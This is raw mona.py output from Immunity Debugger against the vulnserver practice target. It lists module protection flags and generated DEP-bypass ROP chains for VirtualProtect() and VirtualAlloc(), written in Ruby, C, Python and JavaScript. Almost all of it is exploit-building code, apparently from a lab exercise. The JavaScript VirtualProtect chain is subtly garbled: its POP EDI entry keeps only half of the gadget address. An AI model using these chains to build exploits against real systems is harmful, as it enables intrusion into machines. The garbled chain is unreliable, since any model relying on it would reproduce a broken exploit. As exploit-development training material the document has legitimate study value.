================================================================================
  Output generated by mona.py v2.0, rev 600 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : vulnserver (pid 3336)
  Current mona arguments: rop -m *.dll -cp nonull
================================================================================
  2020-02-07 03:55:26
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x776b0000 | 0x776ba000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x76f50000 | 0x76f56000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\ctlister\Downloads\essfunc.dll)
 0x76d80000 | 0x76e4c000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x75bc0000 | 0x75c0a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x75530000 | 0x7556c000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
 0x77b50000 | 0x77bed000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x77770000 | 0x777be000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\ctlister\Downloads\vulnserver.exe)
 0x76b00000 | 0x76bd4000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x776c0000 | 0x7776c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x779c0000 | 0x77afc000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x77290000 | 0x77331000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x773e0000 | 0x77415000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.DLL] (C:\Windows\system32\WS2_32.DLL)
 0x77480000 | 0x77549000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [user32.dll] (C:\Windows\system32\user32.dll)
 0x77420000 | 0x7743f000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x772af2df,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76d9fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77714805,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76f52273,  # & jmp esp [NSI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x77313144,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x7731dae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d9f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x776f1834,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x772b1643,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x75bc1110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x776da7e6,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76e04502,  # &Writable location [MSCTF.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x776f0a31,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x772b1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x76ba56e9,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x779c1052,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x772af2df,  // POP ECX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x6250609c,  // ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76d9fd52,  // MOV ESI,DWORD PTR DS:[ECX] // ADD DH,DH // RETN [MSCTF.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x77714805,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76f52273,  // & jmp esp [NSI.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x77313144,  // POP EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x7731dae9,  // NEG EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d9f9f1,  // XCHG EAX,EBX // RETN [MSCTF.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x776f1834,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x772b1643,  // NEG EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x75bc1110,  // XCHG EAX,EDX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x776da7e6,  // POP ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76e04502,  // &Writable location [MSCTF.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x776f0a31,  // POP EDI // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x772b1645,  // RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x76ba56e9,  // POP EAX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x779c1052,  // PUSHAD // RETN [ntdll.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x772af2df,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76d9fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77714805,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76f52273,  # & jmp esp [NSI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x77313144,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x7731dae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d9f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x776f1834,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x772b1643,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x75bc1110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x776da7e6,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76e04502,  # &Writable location [MSCTF.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x776f0a31,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x772b1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x76ba56e9,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x779c1052,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uf2df%u772a" + // 0x772af2df : ,# POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u609c%u6250" + // 0x6250609c : ,# ptr to &VirtualProtect() [IAT essfunc.dll]
    "%ufd52%u76d9" + // 0x76d9fd52 : ,# MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u4805%u7771" + // 0x77714805 : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u2273%u76f5" + // 0x76f52273 : ,# & jmp esp [NSI.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u3144%u7731" + // 0x77313144 : ,# POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%udae9%u7731" + // 0x7731dae9 : ,# NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%uf9f1%u76d9" + // 0x76d9f9f1 : ,# XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u1834%u776f" + // 0x776f1834 : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u1643%u772b" + // 0x772b1643 : ,# NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u1110%u75bc" + // 0x75bc1110 : ,# XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%ua7e6%u776d" + // 0x776da7e6 : ,# POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u4502%u76e0" + // 0x76e04502 : ,# &Writable location [MSCTF.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u776f" + // 0x776f0a31 : ,# POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u1645%u772b" + // 0x772b1645 : ,# RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u56e9%u76ba" + // 0x76ba56e9 : ,# POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u1052%u779c" + // 0x779c1052 : ,# PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x77729108,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76b01818,  # ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x76d9fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x776e836b,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76f52273,  # & jmp esp [NSI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x76ba757e,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x7731dae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d9f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x776f1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xa1bf4fcd,  # put delta into eax (-> put 0x00001000 into edx)
      0x777ad011,  # ADD EAX,5E40C033 # RETN [GDI32.dll] ** REBASED ** ASLR 
      0x75bc1110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x7770aaca,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76d82fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      0x7555bab7,  # XCHG EAX,ECX # RETN [mswsock.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x77b620f1,  # POP EDI # RETN [USP10.dll] ** REBASED ** ASLR 
      0x772b1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x776ff5d4,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77725cf4,  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x77729108,  // POP ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76b01818,  // ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x76d9fd52,  // MOV ESI,DWORD PTR DS:[ECX] // ADD DH,DH // RETN [MSCTF.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x776e836b,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76f52273,  // & jmp esp [NSI.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x76ba757e,  // POP EAX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x7731dae9,  // NEG EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d9f9f1,  // XCHG EAX,EBX // RETN [MSCTF.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x776f1a3a,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xa1bf4fcd,  // put delta into eax (-> put 0x00001000 into edx)
      0x777ad011,  // ADD EAX,5E40C033 // RETN [GDI32.dll] ** REBASED ** ASLR 
      0x75bc1110,  // XCHG EAX,EDX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x7770aaca,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x76d82fd0,  // NEG EAX // RETN [MSCTF.dll] ** REBASED ** ASLR 
      0x7555bab7,  // XCHG EAX,ECX // RETN [mswsock.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edi:---]
      0x77b620f1,  // POP EDI // RETN [USP10.dll] ** REBASED ** ASLR 
      0x772b1645,  // RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x776ff5d4,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x77725cf4,  // PUSHAD // RETN [msvcrt.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77729108,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76b01818,  # ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x76d9fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x776e836b,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x76f52273,  # & jmp esp [NSI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x76ba757e,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x7731dae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d9f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x776f1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xa1bf4fcd,  # put delta into eax (-> put 0x00001000 into edx)
      0x777ad011,  # ADD EAX,5E40C033 # RETN [GDI32.dll] ** REBASED ** ASLR 
      0x75bc1110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x7770aaca,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76d82fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      0x7555bab7,  # XCHG EAX,ECX # RETN [mswsock.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x77b620f1,  # POP EDI # RETN [USP10.dll] ** REBASED ** ASLR 
      0x772b1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x776ff5d4,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77725cf4,  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u9108%u7772" + // 0x77729108 : ,# POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u1818%u76b0" + // 0x76b01818 : ,# ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
    "%ufd52%u76d9" + // 0x76d9fd52 : ,# MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u836b%u776e" + // 0x776e836b : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u2273%u76f5" + // 0x76f52273 : ,# & jmp esp [NSI.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u757e%u76ba" + // 0x76ba757e : ,# POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%udae9%u7731" + // 0x7731dae9 : ,# NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%uf9f1%u76d9" + // 0x76d9f9f1 : ,# XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u1a3a%u776f" + // 0x776f1a3a : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u4fcd%ua1bf" + // 0xa1bf4fcd : ,# put delta into eax (-> put 0x00001000 into edx)
    "%ud011%u777a" + // 0x777ad011 : ,# ADD EAX,5E40C033 # RETN [GDI32.dll] ** REBASED ** ASLR 
    "%u1110%u75bc" + // 0x75bc1110 : ,# XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%uaaca%u7770" + // 0x7770aaca : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u2fd0%u76d8" + // 0x76d82fd0 : ,# NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "%ubab7%u7555" + // 0x7555bab7 : ,# XCHG EAX,ECX # RETN [mswsock.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u20f1%u77b6" + // 0x77b620f1 : ,# POP EDI # RETN [USP10.dll] ** REBASED ** ASLR 
    "%u1645%u772b" + // 0x772b1645 : ,# RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%uf5d4%u776f" + // 0x776ff5d4 : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u5cf4%u7772" + // 0x77725cf4 : ,# PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

